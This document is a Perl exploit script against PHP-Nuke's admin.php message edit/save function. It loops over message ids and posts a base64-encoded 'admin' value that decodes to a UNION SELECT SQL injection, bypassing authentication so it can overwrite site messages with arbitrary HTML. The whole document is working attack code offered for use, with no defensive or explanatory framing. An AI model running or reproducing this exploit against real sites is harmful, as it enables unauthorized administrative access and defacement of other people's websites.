PHP-Nuke SQL Injection Edit/Save Message(s) Bug
===============================================




#!/usr/bin/perl
#

use LWP; 

$log = "pos_komen_phpnuke_savemsg.txt"; 
$Agent = "Mbahmubangga/1.0";
$proxy = "http://172.9.1.11:80/"; # proxy:port ...
$browser = LWP::UserAgent->new;
$browser -> agent($Agent);

$url = &#039;http://www.sitewithphpnuke.com/admin.php&#039;;

$browser->proxy(http => $proxy) if defined($proxy);

printlog ("\nProcessing: $url\n");

for ($a = 1; $a < 11 ; $a++) {

$mid=$a;

$loginpost = $url;
$loginrequest = HTTP::Request->new(POST => $loginpost);
$loginrequest->content_type(&#039;application/x-www-form-urlencoded&#039;);
$loginsend = 
&#039;title=<h1>JUST TESTING</h1>&#039;.
&#039;&content=you can put HTML format here, all up to you now, 1 liner of course,
or multiple liner with dot&#039;.
&#039;&mlanguage=&#039;. #message language
&#039;&expire=0&#039;. #unlimited
&#039;&active=1&#039;. #yes
&#039;&chng_date=0&#039;.
&#039;&view=1&#039;. #all visitors
&#039;&mdate=&#039;.
&#039;&mid=&#039;.$mid. #the message id, commonly has value under 11
&#039;&admin=eCcgVU5JT04gU0VMRUNUIDEvKjox&#039;. #our magic ammo ==> x&#039;%20UNION%20SELECT%201/*:1
&#039;&add_radminsuper=1&#039;. #the super user / G O D
&#039;&op=savemsg&#039;; #operation
$loginrequest->content-length($loginsend);
$loginrequest->content($loginsend);
$loginresponse = $browser->request($loginrequest);
$logincek = $loginresponse->as_string;
#print ($logincek);


if ($logincek =~ /(500 Can\&#039;t read entity body\: Unknown error)|(411 Length Required)/){
printlog ("$mid attempting edit and saving message sending OK ".$loginresponse-
>status_line ."\n") ;
}
else {
printlog ("Could be failure ".$loginresponse->status_line ."\n");
last;
}

} #end of for

sub printlog {
print @_[0]; 
open(lo,">>$log");
print lo @_[0];
close(lo);
return;
}



